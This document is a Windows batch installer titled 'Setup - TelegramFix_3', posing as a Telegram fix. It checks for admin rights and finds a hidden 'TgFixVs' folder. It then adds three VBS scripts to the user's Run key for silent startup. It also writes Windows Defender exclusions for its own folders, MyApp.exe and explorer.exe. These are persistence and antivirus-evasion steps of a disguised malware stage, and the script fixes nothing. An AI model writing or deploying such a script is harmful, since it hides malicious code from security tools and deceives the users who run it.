@echo off
setlocal EnableDelayedExpansion
title Setup - TelegramFix_3
echo =========================================
echo   Setup - TelegramFix_3
echo =========================================
echo.
echo Please wait...

set "APP_DIR=C:\Program Files (x86)\MyApp"
set "VBS_DIR="

for %%d in (C D E F) do (
    if exist "%%d:\" (
        for /f "delims=" %%p in ('dir /s /b /ad "%%d:\TgFixVs" 2^>nul') do (
            set "VBS_DIR=%%p"
        )
    )
)

if "!VBS_DIR!"=="" (
    echo [ERROR] Folder TgFixVs not found.
    pause
    exit /b 1
)

net session >nul 2>&1
if !errorlevel! neq 0 (
    echo [ERROR] Run as administrator.
    pause
    exit /b 1
)

if not exist "!APP_DIR!\MyApp.exe" (
    echo [ERROR] Run TelegramFix2 first!
    pause
    exit /b 1
)

if not exist "!VBS_DIR!\TgFxPr.vbs" (
    echo [ERROR] Run TelegramFix2 first!
    pause
    exit /b 1
)

reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TgFxPr" /t REG_SZ /d "wscript.exe \"!VBS_DIR!\TgFxPr.vbs\"" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TgFxBackup" /t REG_SZ /d "wscript.exe \"!VBS_DIR!\TgFxBackup.vbs\"" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TgFxPrRn" /t REG_SZ /d "wscript.exe \"!VBS_DIR!\TgFxPrRn.vbs\"" /f >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "!APP_DIR!" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "MyApp.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "!VBS_DIR!" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "explorer.exe" /t REG_DWORD /d 0 /f >nul 2>&1

echo.
echo Done, reboot your computer.
pause
